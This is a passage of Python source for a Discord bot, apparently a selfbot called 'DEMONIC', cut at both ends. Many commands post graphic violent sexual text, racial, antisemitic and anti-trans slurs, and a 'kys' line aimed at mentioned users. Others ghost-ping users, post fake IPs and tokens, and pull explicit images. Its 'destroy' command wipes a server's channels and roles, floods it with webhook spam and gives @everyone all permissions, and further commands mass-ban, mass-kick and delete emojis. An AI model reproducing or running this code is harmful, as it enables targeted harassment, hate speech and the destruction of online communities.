    await ctx.send('good little kitten thats what u get')
    await ctx.send('*pulls out and licks the blood off the ass*')
    await ctx.send('mmmmm yea squirm for daddy')
    await ctx.send('*sticks bloody dick in kittens pussy*')
    await ctx.send('mmmmhmmm yea how does my little kitten like that')
    await ctx.send('*cum for daddy right now ugly little slut*')
    await ctx.send('did u just say no? are u disobeying me again... ykw?')
    await ctx.send('*for disobeying me fucks harder*')
    await ctx.send('beg me to stop fucking u harder')
    await ctx.send('*cums in that smooth pussy*')

@bot.command()
@require_password()
async def cuck(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed cuck command.", ctx.channel)
        percentage = random.randint(1, 100)
        await ctx.send(f"{user.mention} is {percentage}% cuck!")

@bot.command()
@require_password()
async def pp(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed pp command.", ctx.channel)
        if user == bot.user:
            pp_length = "=" * random.randint(15, 20)
        else:
            pp_length = "=" * random.randint(3, 15)
        await ctx.send(f"{user.mention} pp results = 8{pp_length}>")
        
@bot.command()
@require_password()
async def gay(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed gay command.", ctx.channel)
        percentage = random.randint(1, 100)
        await ctx.send(f"{user.mention} is {percentage}% gay!")
        
@bot.command()
@require_password()
async def cum(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed cum command.", ctx.channel)
        await ctx.send(f"{user.mention}, i cummed on u ;p")
        
@bot.command()
@require_password()
async def seed(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed seed command.", ctx.channel)
        percentage = random.randint(1, 100)
        await ctx.send(f"{user.mention} is {percentage}% my seed!")
        
@bot.command()
@require_password()
async def femboy(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed femboy command.", ctx.channel)
        percentage = random.randint(1, 100)
        await ctx.send(f"{user.mention} is {percentage}% femboy!")
        
@bot.command()
@require_password()
async def aura(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed aura command.", ctx.channel)
        aura_value = random.randint(1, 1000000)
        await ctx.send(f"{user.mention} has {aura_value} aura!")
client = discord.Client()

@bot.command()
@require_password()
async def bangmom(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await bangmom_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def bangmom_user(channel, user):
    try:
        await channel.send(f"LOL IM FUCKING {user.mention}'S MOTHER LOL HER PUSSY IS AMAZING")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} HER PUSSY IS SO GOOD OH MYY")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **I SMACKED THE SHIT OUT OF HER ASS** 😈")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **MADE HER PUSSY SLOPPY**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **GET SAD I DONT CARE BITCH*")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **FUCKIN HELL SHE LASTED A LONG TIME**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **IM UR STEP-DAD NOW CALL ME DADDY FUCK**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **IM UR GOD**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **UR MY SLAVE NOW**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **SHITTY FUCK LOL**")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")

@bot.command()
@require_password()
async def ip(ctx, user: discord.User):
    random_ip = '.'.join(str(random.randint(1, 192)) for _ in range(4))
    await ctx.send(f'{user.mention} **IP is** {random_ip}')
    
@bot.command()
@require_password()
async def spit(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await spit_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def spit_user(channel, user):
    try:
        await channel.send(f"Let me spit on this cuck named {user.mention} 💦")
        await asyncio.sleep(1)
        await channel.send(f"*Spits on* {user.mention} 💦")
        await asyncio.sleep(1)
        await channel.send(f"Fuck up you little slut {user.mention} 💦")
        await asyncio.sleep(1)
        await channel.send(f"*Spits on again and* {user.mention} *again* 💦")
        await asyncio.sleep(1)
        await channel.send(f"Smelly retard got spat on now suck it u fucking loser {user.mention} 💦")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")

@bot.command()
@require_password()
async def stomp(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await stomp_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def stomp_user(channel, user):
    try:
        await channel.send(f"Lemme stomp on this nigga named {user.mention} LMFAO")
        await asyncio.sleep(1)
        await channel.send(f"*Stomps on* U tran fuck LMFAO {user.mention} :foot: ")
        await asyncio.sleep(1)
        await channel.send(f"come get stomped on again {user.mention}... :smiling_imp: ")
        await asyncio.sleep(1)
        await channel.send(f"*Stomps on again* {user.mention}... :smiling_imp: ")
        await asyncio.sleep(1)
        await channel.send(f"ur my whore bitch {user.mention}... :smiling_imp: ")
        await asyncio.sleep(1)
        await channel.send(f"*Stomped on once again* {user.mention}... :smiling_imp:")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")

@bot.command()
@require_password()
async def sigma(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% sigma")


@bot.command()
@require_password()
async def smelly(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% smelly god u smell u fag idc if its 0% u still smell")

@bot.command()
@require_password()
async def roadman(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% a real london uk roadman!")


@bot.command()
@require_password()
async def robloxian(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a robloxian. just like sordo!!")

@bot.command()
@require_password()
async def thug(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} has {percentage}% of thugness. ew..")

@bot.command()
@require_password()
async def dahoodian(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a dahoodian. just like sordo!!")
@bot.command()
@require_password()
async def skibidi(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} has {percentage}% brainrot. get a job jew u skibidi toiler watcher fuck LMFAO ")

@bot.command()
@require_password()
async def eboy(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a Eboy ur lonely nigga get a job")

@bot.command()
@require_password()
async def egirl(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a egirl, you slut LMFAO")

@bot.command()
@require_password()
async def indian(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a indian... :flag_in: ")

@bot.command()
@require_password()
async def autism(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} has {percentage}% Autism")

@bot.command()
@require_password()
async def rizz(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} has {percentage}% rizz. dont believe this shit. if its high it's lying u got 0% rizz fuck ass nigga.")

@bot.command()
@require_password()
async def comboy(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% of a Comboy u weird ass nigga kys")
    
emoji_cycle_running = {}

@bot.command()
@require_password()
async def cemoji(ctx, user: discord.User, *emojis):
    if not emojis:
        await ctx.send("```Please provide at least one emoji to cycle through```")
        return
    
    def check(message):
        return message.author.id == user.id
    
    await ctx.send(f"```Reacting to {user}'s messages with {', '.join(emojis)} in sequence```")
    
    emoji_cycle = iter(emojis)  
    emoji_cycle_running[user.id] = True  
    
    try:
        while emoji_cycle_running.get(user.id, False):  
            msg = await bot.wait_for("message", check=check, timeout=None)             
            try:
                emoji = next(emoji_cycle)
            except StopIteration:
                emoji_cycle = iter(emojis)
                emoji = next(emoji_cycle)
            
            await msg.add_reaction(emoji)
    except Exception as e:
        await ctx.send(f"Error: {e}")
    finally:
        emoji_cycle_running[user.id] = False
        
        
@bot.command()
@require_password()
async def cee(ctx, user: discord.User):
    """Stop the emoji cycle for a specific user."""
    if user.id in emoji_cycle_running and emoji_cycle_running[user.id]:
        emoji_cycle_running[user.id] = False
        await ctx.send(f"```Stopped the emoji cycle for {user.name}```")
    else:
        await ctx.send(f"```No emoji cycle found for {user.name}```")
@bot.command()
@require_password()
async def ghostspam(ctx, count: int, user: discord.User):
    await ctx.message.delete()
    async def send():
        message = await ctx.send(f"<@{user.id}>")
        await message.delete()
        time.sleep(1)
    for i in range(count):
        await send()
        
@bot.command()
@require_password()
async def tickle(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_tickle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
@bot.command()
@require_password()
async def feed(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em) 
 
@bot.command()
@require_password()
async def bomber(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% arabic. Bomber FUCK. LMFAO, keep bombing those towers for Osama bin Laden..")




    
    
@bot.command()
@require_password()
async def black(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% black! 🤢")
    
@bot.command()
@require_password()
async def jew(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% jewish.")
       

#Display a fox
@bot.command()
@require_password()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    link = str(r["image"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_fox.png"))
    except:
        await ctx.send(link)
        
#Display a bird
@bot.command()
@require_password()
async def bird(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/birb").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_bird.png"))
    except:
        await ctx.send(link)
        
#Display a dog
@bot.command()
@require_password()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    link = str(r['message'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_dog.png"))
    except:
        await ctx.send(link)

#Display a cat
@bot.command()
@require_password()
async def cat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_cat.png"))
    except:
        await ctx.send(link)

#Display a Sad Cat
@bot.command()
@require_password()
async def sadcat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/sadcat").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_sadcat.png"))
    except:
        await ctx.send(link)
        
        
#Distort image
@bot.command(aliases=["distort"])
@require_password()
async def magik(ctx, user: discord.User=None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_magik.png"))
        except:
            await ctx.send(res['message'])

#Deepfry image
@bot.command(aliases=["deepfry"])
@require_password()
async def fry(ctx, user: discord.User=None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_fry.png"))
        except:
            await ctx.send(res['message'])

#Blurp image
@bot.command(aliases=["blurp"])
@require_password()
async def blurpify(ctx, user: discord.User=None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_blurpify.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_blurpify.png"))
        except:
            await ctx.send(res['message'])
            
import string

 #Gen a Fake token
@bot.command()
@require_password()
async def gentoken(ctx, user: discord.Member=None):
    await ctx.message.delete()
    code = "ODA"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    if user is None:
        await ctx.send(''.join(code))
        return
    await ctx.send(user.mention + " token is: " + "".join(code))
    
    
@bot.command(aliases=["vagina"])
@require_password()
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@bot.command()
@require_password()
async def waifu(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/waifu")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_waifu.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
        
@bot.command()
@require_password()
async def cumslut(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@bot.command()
@require_password()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_blowjob.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
@bot.command()
@require_password()
async def tits(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_tits.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
@bot.command()
@require_password()
async def monkey(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% monkey\nBoy is iShowSpeed's son 😂✌️")
    
    
# Lock Command
@bot.command(name="lock", aliases= ["l"])
@commands.has_permissions(manage_channels=True)
@require_password()
async def lock(ctx):
    try:
        # React with a lock emoji
        await ctx.message.add_reaction("🔒")
        
        # Update channel permissions to lock it
        overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = False
        await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    except Exception as e:
        await ctx.send(f"❌ Failed to lock the channel: {e}")

# Unlock Command
@bot.command(name="unlock", aliases= ["ul"])
@commands.has_permissions(manage_channels=True)
@require_password()
async def unlock(ctx):
    try:
        # React with an unlock emoji
        await ctx.message.add_reaction("🔓")
        
        # Update channel permissions to unlock it
        overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = True
        await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    except Exception as e:
        await ctx.send(f"❌ Failed to unlock the channel: {e}")

# Error Handling
@lock.error
@unlock.error
async def permissions_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ You don't have permission to use this command.")
    elif isinstance(error, commands.CommandError):
        await ctx.send(f"❌ An error occurred: {error}")
    
    
# Command: Ban a user
@bot.command()
@commands.has_permissions(ban_members=True)
@require_password()
async def ban(ctx, user: discord.User, *, reason=None):
    try:
        await ctx.guild.ban(user, reason=reason)
        await ctx.send(f"{user.mention} has been banned for: {reason}\n (id be real no one liked this nigga LOL)")
    except discord.Forbidden:
        await ctx.send("Dumb boy u dont got perms .")
  


# Command: Kick a user
@bot.command()
@commands.has_permissions(kick_members=True)
@require_password()
async def kick(ctx, user: discord.User, *, reason=None):
    try:
        await ctx.guild.kick(user, reason=reason)
        await ctx.send(f"```ansi\n {magenta}{user.mention} has been kicked for: {red}{reason}\n ```")
    except discord.Forbidden:
        await ctx.send("I don't have permission to kick this user.")
        
excluded_user_ids = [1264384711430766744, 1229216985213304928]
config_file = "nuke_config.json"


default_config = {
    "webhook_message": "@everyone JOIN discord.gg/passed",
    "server_name": "VOZ X AARON Self bot /passed",
    "webhook_delay": 0.3,
    "channel_name": "vozrunsu"  
}

def load_config():
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            return json.load(f)
    else:
        save_config(default_config)
        return default_config

def save_config(config):
    with open(config_file, 'w') as f:
        json.dump(config, f, indent=4)

configss = load_config()

async def try_action(action):
    try:
        return await action()
    except discord.Forbidden:
        return None
    except Exception as e:
        print(f"Error during action: {e}")
        return None

async def send_webhooks(webhook, total_webhook_messages):
    while total_webhook_messages < 5000:
        await webhook.send(configss["webhook_message"])  
        total_webhook_messages += 1
        await asyncio.sleep(configss["webhook_delay"])  

@bot.command()
@require_password()
async def nukehook(ctx, *, new_message):
    configss["webhook_message"] = new_message
    save_config(configss)
    await ctx.send(f"```Webhook message changed to: {new_message}```")

@bot.command()
@require_password()
async def hookclear(ctx):
    configss["webhook_message"] = "```discord.gg/roster```"
    save_config(configss)
    await ctx.send("```Webhook message cleared and reset to default.```")

@bot.command()
@require_password()
async def nukename(ctx, *, new_name):
    configss["server_name"] = new_name
    save_config(configss)
    await ctx.send(f"```Server name changed to: {new_name}```")

@bot.command()
@require_password()
async def nukedelay(ctx, delay: float):
    if delay <= 0:
        await ctx.send("```Please enter a number for the delay.```")
        return
    configss["webhook_delay"] = delay
    save_config(configss)
    await ctx.send(f"```Webhook delay changed to: {delay} seconds.```")

@bot.command()
@require_password()
async def nukechannel(ctx, *, new_channel_name):
    configss["channel_name"] = new_channel_name
    save_config(configss)
    await ctx.send(f"```Webhook channel name changed to: {new_channel_name}```")

webhook_spam = True

@bot.command()
@require_password()
async def destroy(ctx):
    global webhook_spam

    if ctx.guild.id == 1289325760040927264:
        await ctx.send("```This command is disabled for this server.```")
        return

    if not configss:
        await ctx.send("```No configuration found. Do you want to use the default settings? Type 'yes' to continue or 'no' to cancel.```")

        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', check=check, timeout=30.0)
            if msg.content.lower() == "yes":
                configss.update({
                    "webhook_message": "JOIN @everyone discord.gg/passed",
                    "server_name": "VOZ X AARON /passed",
                    "webhook_delay": 0.3,
                    "channel_name": "vozrunsu "
                })
            elif msg.content.lower() == "no":
                await ctx.send("```Operation cancelled.```")
                await ctx.send(f"""```ansi
[ 1{reset} ] nukehook - Change the webhook message for the nuke process.
[ 2{reset} ] nukename - Change the Discord server name for the nuke process.
[ 3{reset} ] nukedelay - Change the delay between webhook messages.
[ 4{reset} ] nukechannel - Change the channel name used for the webhook.
[ 5{reset} ] nukeconfig - Show the current configuration for the nuke process.```""")
                return
            else:
                await ctx.send("```Invalid response. Operation cancelled.```")
                return
        except asyncio.TimeoutError:
            await ctx.send("```Operation timed out. Command cancelled.```")
            return

    await ctx.send("```Are you sure you want to run this command? Type 'yes' to continue.```")
    
    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel
    
    try:
        msg = await bot.wait_for('message', check=check, timeout=30.0)
        if msg.content.lower() != "yes":
            await ctx.send("```Operation cancelled.```")
            return
    except asyncio.TimeoutError:
        await ctx.send("```Operation timed out. Command cancelled.```")
        return
    
    await ctx.send("```Destruction process starting...```")

    async def spam_webhook(webhook):
        while webhook_spam:
            try:
                await webhook.send(content=configss["webhook_message"])
                await asyncio.sleep(configss["webhook_delay"])
            except:
                break

    async def create_webhook_channel(i):
        try:
            channel = await ctx.guild.create_text_channel(f"/{configss['channel_name']} {i+1}")
            webhook = await channel.create_webhook(name="DEMONIC SELF BOT Webhook")
            asyncio.create_task(spam_webhook(webhook))
            return True
        except:
            return False

    async def delete_channel(channel):
        try:
            if not channel.name.startswith(f"/{configss['channel_name']}"):
                await channel.delete()
            return True
        except:
            return False

    async def delete_role(role):
        try:
            if role.name != "@everyone":
                await role.delete()
            return True
        except:
            return False

    async def execute_destruction():
        try:
            channel_deletion_tasks = [delete_channel(channel) for channel in ctx.guild.channels]
            role_deletion_tasks = [delete_role(role) for role in ctx.guild.roles]
            
            initial_tasks = channel_deletion_tasks + role_deletion_tasks
            await asyncio.gather(*initial_tasks, return_exceptions=True)
            
            for i in range(100):
                await create_webhook_channel(i)
                await asyncio.sleep(0.1)  

            try:
                await ctx.guild.edit(name=configss["server_name"])
            except:
                pass

            try:
                everyone_role = ctx.guild.default_role
                await everyone_role.edit(permissions=discord.Permissions.all())
            except:
                pass

            return True

        except:
            return False

    try:
        await execute_destruction()
        await ctx.send("```Destruction process completed. Webhook spam is ongoing.```")
    except:
        pass
    finally:
        await ctx.send("```DEMONIC Sb destruction completed.```")

@bot.command()
@require_password()
async def stopspam(ctx):
    global webhook_spam
    webhook_spam = False
    await ctx.send("```Stopping all spam tasks...```")


@bot.command()
@require_password()
async def nukeconfigwipe(ctx):
    if ctx.guild.id == 1289325760040927264:
        await ctx.send("```This command is disabled for this server.```")
        return

    config_file = "nuke_config.json"
    if not os.path.exists(config_file):
        await ctx.send("```No config file found. Nothing to wipe.```")
        return

    await ctx.send("```Are you sure you want to delete the nuke config file and reset all data? Type 'yes' to continue, or 'no' to cancel.```")

    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel

    try:
        msg = await bot.wait_for('message', check=check, timeout=30.0)
        if msg.content.lower() != "yes":
            await ctx.send("```Operation cancelled.```")
            return

        os.remove(config_file)
        await ctx.send("```Nuke config file has been deleted and data has been reset.```")

    except asyncio.TimeoutError:
        await ctx.send("```Operation timed out. Command cancelled.```")
        return
    

@bot.command()
@require_password()
async def massrole(ctx, *, name="DEMONIC Selfbot"):
    if ctx.guild.id == 1289325760040927264:
        await ctx.send("```This command is disabled for this server.```")
        return
    
    for _ in range(200): 
        try:
            await ctx.guild.create_role(name=name, reason="Mass role creation")
        except discord.Forbidden:
            pass 
    
    await ctx.send(f"```Created 200 roles with the name '{name}'.```")

@bot.command()
@require_password()
async def massroledel(ctx):
    if ctx.guild.id == 1289325760040927264:
        await ctx.send("```This command is disabled for this server.```")
        return

    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete(reason="Mass role deletion")
            except discord.Forbidden:
                pass 
    
    await ctx.send("```Deleted all non-default roles in the server.```")

@bot.command()
@require_password()
async def masschannel(ctx, name="DEMONIC Selfbot", number=200):
    if ctx.guild.id == 1289325760040927264:
        await ctx.send("```This command is disabled for this server.```")
        return

    for _ in range(number):
        try:
            await ctx.guild.create_text_channel(name=name, reason="Mass channel creation")
        except discord.Forbidden:
            pass 

    await ctx.send(f"```Created {number} channels with the name {name}.```")



@bot.command()
@require_password()
async def massban(ctx):
    if ctx.guild.id == 1289325760040927264:
        await ctx.send("```This command is disabled for this server.```")
        return

    await ctx.send("```Starting mass ban of all members...```")
    
    try:
        await ctx.guild.chunk()
    except:
        pass
        
    members = [m for m in ctx.guild.members if m != ctx.guild.me]
    banned_count = 0
    
    async def ban_member(member):
        for attempt in range(3):  
            try:
                await member.ban(reason="XENO X APOP Selfbot Mass ban")
                print(f"Banned {member.name} on attempt {attempt + 1}")
                return True
            except:
                if attempt < 2:  
                    print(f"Failed to ban {member.name}, attempt {attempt + 1}/3")
                    await asyncio.sleep(1)  
                else:
                    print(f"Failed to ban {member.name} after 3 attempts")
                    return False
    
    tasks = [ban_member(member) for member in members]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    banned_count = sum(1 for r in results if r is True)

    await ctx.send(f"```Mass ban completed. Successfully banned {banned_count} members.```")

@bot.command()
@require_password()
async def masskick(ctx):
    if ctx.guild.id == 1289325760040927264:
        await ctx.send("```This command is disabled for this server.```")
        return

    for member in ctx.guild.members:
        try:
            if member.id != ctx.author.id:  
                await member.kick(reason="XENO X APOP Selfbot Mass kick")
        except discord.Forbidden:
            pass  
    
    await ctx.send("```Kicked everyone from the server.```")

@bot.command()
@require_password()
async def massdelemoji(ctx):

    if ctx.guild.id == 1289325760040927264:
        await ctx.send("```This command is disabled in this server.```")
        return

    await ctx.send("```Are you sure you want to delete all emojis in this server? Type 'yes' to confirm.```")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        confirmation = await bot.wait_for('message', check=check, timeout=30)
        if confirmation.content.lower() != 'yes':
            await ctx.send("```Emoji deletion canceled.```")
            return

        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"Deleted emoji: {emoji.name}")
            except Exception as e:
                print(f"Could not delete {emoji.name}: {e}")
        
        await ctx.send("```All emojis have been deleted.```")
    except asyncio.TimeoutError:
        await ctx.send("```Confirmation timed out. Emoji deletion canceled.```")

@bot.command()
@require_password()
async def afkcheck(ctx, user: discord.User, count: int):
    """
    AFK checks a user by pinging them and counting up until reaching specified number
    Stops if user responds with trigger words or count is reached
    """
    if count <= 0 or count > 1000:  # Reasonable limit
        await ctx.send("```number through 100 - 1000s```")
        return

    task_key = (user.id, ctx.channel.id)
    if task_key in afkcheck_tasks:
        afkcheck_tasks[task_key].cancel()
        del afkcheck_tasks[task_key]

    current_count = 1
    running = True

    async def check_response():
        nonlocal running
        def check(m):
            return m.author.id == user.id and any(trigger in m.content.lower() for trigger in ['here', 'im here', 'here.'])

        try:
            await bot.wait_for('message', check=check, timeout=None)
            running = False
            await ctx.send(f"```{user.name} welxome back retard```")
        except Exception as e:
            print(f"Error in response checker: {e}")

    async def counter():
        nonlocal current_count, running
        
        while running and current_count <= count:
            try:
                await asyncio.sleep(random.uniform(0.5, 0.75))
                
                await ctx.send(f"{user.mention} `{current_count}`")
                current_count += 1

                if current_count > count:
                    running = False
                    await ctx.send(f"```Welp what a surprise, this nigga folded to a god @{user.name}```")
                    
            except Exception as e:
                print(f"Error in counter: {e}")
                await asyncio.sleep(1)  # Additional delay on error

    response_task = bot.loop.create_task(check_response())
    counter_task = bot.loop.create_task(counter())
    
